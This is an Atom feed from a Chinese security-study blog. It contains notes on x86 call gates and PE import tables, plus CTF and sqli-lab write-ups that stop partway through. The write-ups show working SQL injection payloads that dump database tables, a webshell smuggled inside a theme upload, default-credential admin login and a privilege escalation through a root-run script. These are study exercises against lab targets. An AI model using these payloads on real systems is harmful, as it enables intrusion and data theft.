<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sunr&#39;s Blog</title>
  
  
  <link href="http://0w0.host/atom.xml" rel="self"/>
  
  <link href="http://0w0.host/"/>
  <updated>2021-02-04T14:51:30.812Z</updated>
  <id>http://0w0.host/</id>
  
  <author>
    <name>Sunr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>调用门笔记</title>
    <link href="http://0w0.host/2021/02/04/%E8%B0%83%E7%94%A8%E9%97%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://0w0.host/2021/02/04/%E8%B0%83%E7%94%A8%E9%97%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2021-02-04T14:00:20.000Z</published>
    <updated>2021-02-04T14:51:30.812Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-练习1"><a href="#0x00-练习1" class="headerlink" title="0x00 练习1"></a>0x00 练习1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line">DWORD g_esp;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">        pushfd</span><br><span class="line">        pushad</span><br><span class="line">mov eax,esp</span><br><span class="line">mov [eax+<span class="number">0x24</span>],<span class="number">0x00401060</span></span><br><span class="line">mov [eax+<span class="number">0x24</span>+<span class="number">0x4</span>],<span class="number">0x08</span></span><br><span class="line">mov ebx,dword ptr[eax+<span class="number">0x24</span>+<span class="number">0x8</span>]</span><br><span class="line">mov g_esp,ebx</span><br><span class="line">mov [eax+<span class="number">0x24</span>+<span class="number">0x8</span>],esp</span><br><span class="line">mov [eax+<span class="number">0x24</span>+<span class="number">0x1c</span>],ss</span><br><span class="line">popad</span><br><span class="line">        popfd</span><br><span class="line">        retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">mov eax,<span class="number">0x8003f048</span></span><br><span class="line">mov [eax],<span class="number">0x80</span></span><br><span class="line">call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   __asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//int 3</span></span><br><span class="line">mov eax,esp</span><br><span class="line">mov dword ptr[eax],<span class="number">0x004010ce</span></span><br><span class="line">mov dword ptr[eax+<span class="number">0x4</span>],<span class="number">0x1b</span></span><br><span class="line">mov ebx,g_esp</span><br><span class="line">mov [eax+<span class="number">8</span>],ebx</span><br><span class="line">mov [eax+<span class="number">0x1c</span>],<span class="number">0x23</span></span><br><span class="line">retf</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3环程序通过调用门进0环，再通过修改堆栈实现任意跳转，再调用调用门，修复堆栈retf回主函数，程序回到3环</p><h1 id="0x01-练习2"><a href="#0x01-练习2" class="headerlink" title="0x01 练习2"></a>0x01 练习2</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;0x00-练习1&quot;&gt;&lt;a href=&quot;#0x00-练习1&quot; class=&quot;headerlink&quot; title=&quot;0x00 练习1&quot;&gt;&lt;/a&gt;0x00 练习1&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;t</summary>
      
    
    
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="保护模式" scheme="http://0w0.host/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>导入表学习笔记</title>
    <link href="http://0w0.host/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://0w0.host/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-26T16:57:31.000Z</published>
    <updated>2021-02-04T14:01:08.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="导入表学习笔记"><a href="#导入表学习笔记" class="headerlink" title="导入表学习笔记"></a>导入表学习笔记</h1><hr><h2 id="0x00-导入表概述"><a href="#0x00-导入表概述" class="headerlink" title="0x00 导入表概述"></a>0x00 导入表概述</h2><p>当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。</p><a id="more"></a><p>而导入表则是位于IMAGE_DIRECTORY_ENTRY_IMPORT的第2项，而第2项指向的仍是一个数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics; <span class="comment">//通常为0</span></span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>然后我们来看几个重要点的值</p><ol><li><p><code>DWORD   OriginalFirstThunk;</code>为INT表，是一个RVA指向了一个<code>PIMAGE_THUNK_DATA</code>结构</p><p>当<code>PIMAGE_THUNK_DATA</code>的最高位为1时为一个序号，是一个以序号导出的函数的导出序号        </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><pre><code>当`PIMAGE_THUNK_DATA`的最高位为0时为一个RVA指针，而里面存的是RVA且指向`_IMAGE_IMPORT_BY_NAME`结构</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><pre><code>且其中Hint为序号，不一定是导出序号，大部分的编译器置0；而Name则是指向函数名称首字符。</code></pre><ol start="2"><li><p><code>DWORD   TimeDateStamp; </code>为时间戳</p><p>当时间戳为0时表示为该dll未绑定</p><p>当时间戳不为0时则该dll已被绑定，且时间戳于dll的时间戳相同（New Bound），如果不同则绑定已过期（Old Bound）</p></li><li><p><code>DWORD   Name;</code>为dll的文件名的地址(RVA)</p></li><li><p><code>DWORD   FirstThunk; </code>IAT表，在文件中值与INT表相同，在内存中载入后则为函数的真实地址(RVA)；如果该dll已绑定，则该值为该dll函数的真实地址</p></li></ol><h2 id="0x01-导入表基本图解"><a href="#0x01-导入表基本图解" class="headerlink" title="0x01 导入表基本图解"></a>0x01 导入表基本图解</h2><p><img src="https://i.loli.net/2021/01/26/Uc8ZDgwiV5ldFWq.png" alt="image-20210126011214938"></p><p><img src="https://i.loli.net/2021/01/26/Jiuf29PLQv8Hyw1.png" alt="image-20210126011353615"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导入表学习笔记&quot;&gt;&lt;a href=&quot;#导入表学习笔记&quot; class=&quot;headerlink&quot; title=&quot;导入表学习笔记&quot;&gt;&lt;/a&gt;导入表学习笔记&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x00-导入表概述&quot;&gt;&lt;a href=&quot;#0x00-导入表概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 导入表概述&quot;&gt;&lt;/a&gt;0x00 导入表概述&lt;/h2&gt;&lt;p&gt;当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。&lt;/p&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF[BJDCTF2020]Mark loves cat</title>
    <link href="http://0w0.host/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/"/>
    <id>http://0w0.host/2020/09/20/BUUCTF-BJDCTF2020-Mark-loves-cat/</id>
    <published>2020-09-19T16:02:26.000Z</published>
    <updated>2020-09-19T17:56:15.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><a id="more"></a><p>一开局看样子可能是已知cms的漏洞的利用<br><img src="https://i.loli.net/2020/09/20/ckrmQGbNgTolFi3.png" alt="image.png"><br>开始扫一波后台试试<br>没扫到后台，但是发现一个挺有趣的东西<br><img src="https://i.loli.net/2020/09/20/8WkrtnuKzvGDwaU.png" alt="image.png"><br>git源码泄露</p><p>这时候就要祭出githack了<br><code>python GitHack.py http://Domain/.git/</code></p><p>接下来就是代码审计了<br>这无能为力，只能去看看大牛们之前的wp</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;BJDCTF2020-Mark-loves-cat&quot;&gt;&lt;a href=&quot;#BJDCTF2020-Mark-loves-cat&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]Mark loves cat&quot;&gt;&lt;/a&gt;[BJDCTF2020]Mark loves cat&lt;/h2&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="CTF" scheme="http://0w0.host/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF[GKCTF2020]老八小超市儿</title>
    <link href="http://0w0.host/2020/09/18/GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/"/>
    <id>http://0w0.host/2020/09/18/GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/</id>
    <published>2020-09-18T15:00:56.000Z</published>
    <updated>2020-09-18T16:29:03.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><a id="more"></a><p>一打开看就是<br><img src="https://i.loli.net/2020/09/18/4bMcJlihOLStP9Q.png" alt="image.png"><br><img src="https://i.loli.net/2020/09/18/fI9Vb6QkTHg7Cdh.png" alt="__IAH4_0J1L1XP8D_M_C@ZU.png"><br>ShopXO映入眼帘，这应该是个cms的已知漏洞利用</p><p>通过robots.txt可知</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;index.php?s&#x3D;&#x2F;admin*</span><br><span class="line">Disallow: &#x2F;index.php?s&#x3D;&#x2F;install*</span><br><span class="line">Disallow: &#x2F;index.php?s&#x3D;&#x2F;api*</span><br><span class="line">Disallow: &#x2F;admin*</span><br><span class="line">Disallow: &#x2F;api*</span><br><span class="line">Disallow: &#x2F;install*</span><br><span class="line">Disallow: &#x2F;*respond.php</span><br><span class="line">Disallow: &#x2F;*notify.php</span><br><span class="line">Disallow: &#x2F;public*</span><br></pre></td></tr></table></figure><p><code>/admin.php?s=/admin/login.php</code> 是后台地址<br><code>默认用户名密码：admin - shopxo</code><br><img src="https://i.loli.net/2020/09/18/QB6CUa74i9EtcMG.png" alt="image.png"><br>成功登入</p><p>翻了下功能列表，发现<br><img src="https://i.loli.net/2020/09/18/rDyjdxGAqRl53oi.png" alt="image.png"><br>开始尝试getshell</p><p><img src="https://i.loli.net/2020/09/18/oechnTqJu1kGS87.png" alt="image.png"></p><p>通过基本判断，系统应该是Linux，且是apache的中间件</p><p>开始写shell，但却显示<code>SQLSTATE[HY093]: Invalid parameter number: no parameters were bound</code>，应该是被过滤掉了，好好看看功能列表其他功能</p><p><img src="https://i.loli.net/2020/09/18/fNDbt1w4ZkuHyAW.png" alt="image.png"><br>看到这个突然想起今天看长亭对于小米路由器所挖的洞的报告<br>尝试一下</p><p>看了下默认模板的展示图的路径<code>/public/static/index/default/images/preview.jpg</code><br>我们去下载个正常的模板上传<br><img src="https://i.loli.net/2020/09/18/h2e5ZifgDK1MvEz.png" alt="image.png"><br>右边的主题未应用<br><code>/public/static/index/lengyu/images/preview.jpg</code><br>大概可以推测解压后的路径是<br><code>/public/static/index/压缩包名称/文件名称</code><br>我们上传一个压缩包<br><code>1.zip/1.txt -&gt; Test 1</code><br>显示上传成功，但是访问<code>/public/static/index/1/1.txt</code>失败，说明有着过滤行为<br>我们尝试在主题包中加入1.txt<br><img src="https://i.loli.net/2020/09/18/P65o3DQ8Zs19w4N.png" alt="image.png"><br>包裹成功，尝试getshell<br><img src="https://i.loli.net/2020/09/18/CBa8A5ghIOsJdXY.png" alt="image.png"><br>查看<br><code>flag&#123;this_is_fake_flag/true_flag_in_/root&#125;</code><br>开始提权，首先nc 反弹shell<br>好像不行，可能是我太菜了<br><img src="https://i.loli.net/2020/09/18/fI9Vb6QkTHg7Cdh.png" alt="__IAH4_0J1L1XP8D_M_C@ZU.png"><br>重新看了一下目录发现这样一个文件<br><img src="https://i.loli.net/2020/09/19/NPZbSvanDxKI3VQ.png" alt="image.png"><br><img src="https://i.loli.net/2020/09/19/ThHtxJA82oXpfim.png" alt="image.png"><br>是一个有权限的脚本<br>尝试修改<br><img src="https://i.loli.net/2020/09/19/Gkz2ondMtvFSqf8.png" alt="image.png"><br>不过没有权限操作，接下来去看看那个py脚本<br><img src="https://i.loli.net/2020/09/19/CjTDE35k4NQragX.png" alt="image.png"><br>修改<code>os.system()</code>的命令<br><code>os.system(&quot;cat /root/flag &gt; /1 &quot;)</code><br>让我们等等</p><p><code>flag&#123;c1844de2-765c-40c0-b3c1-fdd3bfd2fe87&#125;</code><br>成功</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;GKCTF2020-老八小超市儿&quot;&gt;&lt;a href=&quot;#GKCTF2020-老八小超市儿&quot; class=&quot;headerlink&quot; title=&quot;[GKCTF2020]老八小超市儿&quot;&gt;&lt;/a&gt;[GKCTF2020]老八小超市儿&lt;/h2&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="CTF" scheme="http://0w0.host/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF[SUCTF 2019]EasySQL</title>
    <link href="http://0w0.host/2020/09/17/BUUCTF-SUCTF-2019-EasySQL/"/>
    <id>http://0w0.host/2020/09/17/BUUCTF-SUCTF-2019-EasySQL/</id>
    <published>2020-09-17T13:42:40.000Z</published>
    <updated>2020-09-18T03:57:00.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><a id="more"></a><p>一上来就是一个提交参数框，输入1后返回<br><img src="https://i.loli.net/2020/09/17/h38MbikZs7HlD6w.png" alt="image.png"></p><p>尝试注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; 无回显</span></span><br><span class="line"><span class="string">query=1\ 无回显</span></span><br><span class="line"><span class="string">query=1&quot; 回显Nonono.</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- ss 回显Nonono.</span></span><br><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- ss  回显正常</span></span><br><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="operator">||</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- ss  回显正常</span></span><br></pre></td></tr></table></figure><p>探测出是数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="keyword">order</span>  <span class="keyword">by</span> <span class="number">100000000</span>  <span class="comment">-- ss 回显正常</span></span><br><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">100000000</span>  <span class="comment">-- ss 回显正常</span></span><br></pre></td></tr></table></figure><p>淦，看来不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,sleep(<span class="number">5</span>)) <span class="comment">-- ss </span></span><br></pre></td></tr></table></figure><p>尝试盲注无功而返</p><hr><p>应该是过滤得十分严格，害<br>但这个输出界面让我想到了堆叠注入</p><hr><p>尝试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query<span class="operator">=</span><span class="number">1</span> ; <span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/17/UoVeiX68CDgIcYk.png" alt="image.png"><br>有了<br><img src="https://i.loli.net/2020/09/17/7olYqPOWXt2n3gL.png" alt="image.png"></p><p>不过不能直接读取flag</p><p>直接可以select 1<br>但是不能select * from ctf<br>说明是过滤掉了from<br>试了试各种方法<br>emm，想不到什么bypass方法，上网搜了下前面大佬萌的wp</p><p>我还是太菜了，害</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_GET[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>当然，这里还可以直接<code>*,1</code>爆出flag（网上大佬说是没有过滤</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-EasySQL&quot;&gt;&lt;a href=&quot;#SUCTF-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]EasySQL&quot;&gt;&lt;/a&gt;[SUCTF 2019]EasySQL&lt;/h2&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="CTF" scheme="http://0w0.host/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab Less 54-Less 65</title>
    <link href="http://0w0.host/2020/09/10/sqli-lab-Less-54-Less-65/"/>
    <id>http://0w0.host/2020/09/10/sqli-lab-Less-54-Less-65/</id>
    <published>2020-09-10T07:12:25.000Z</published>
    <updated>2020-09-10T14:09:05.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-54-Less-65"><a href="#Sqli-lab-过关笔记-Less-54-Less-65" class="headerlink" title="Sqli-lab 过关笔记 Less 54-Less 65"></a>Sqli-lab 过关笔记 Less 54-Less 65</h1><blockquote><p>Start Challenge</p></blockquote><a id="more"></a><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>The objective of this challenge is to dump the (secret key) from only random table from Database (‘CHALLENGES’) in Less than 10 attempts<br>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.<br>凑，开局暴击，10次机会，错过就重置<br>首先用判断出是单引号闭合，然后使用order by 猜字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 100 # 正常</span></span><br></pre></td></tr></table></figure><p>emmm好像order by没用，那就用group by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; group by 3 # 正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">4</span> # 错误 </span><br></pre></td></tr></table></figure><p>判断出有3个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 #</span></span><br></pre></td></tr></table></figure><p>爆出是<code>challenges</code>为数据库名<br>次数不够了，重置一下开始爆表名和字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure><p>表名<code>zd7hw1th7d</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>zd7hw1th7d<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure><p><code>id,sessid,secret_K1CG,tryy</code></p><p>让我们查看一下secret_K1CG字段的value</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(0x7e,secret_K1CG,0x7e),3 from zd7hw1th7d  --+</span></span><br></pre></td></tr></table></figure><p>爆出内容<br><code>~apBmqSPfQcta3g5dwVyPoO00~</code><br>key：apBmqSPfQcta3g5dwVyPoO00<br>过关</p><hr><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>开始探测闭合方式（可以用burp爆破）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> (<span class="number">1</span>  正常</span><br></pre></td></tr></table></figure><p>是小括号闭合</p><p>猜表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w4xiim6dlu</span><br></pre></td></tr></table></figure><p>让我们看看<br><code>w4xiim6dlu</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;w4xiim6dlu&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆出</p><figure class="highlight plain"><table><tr><td 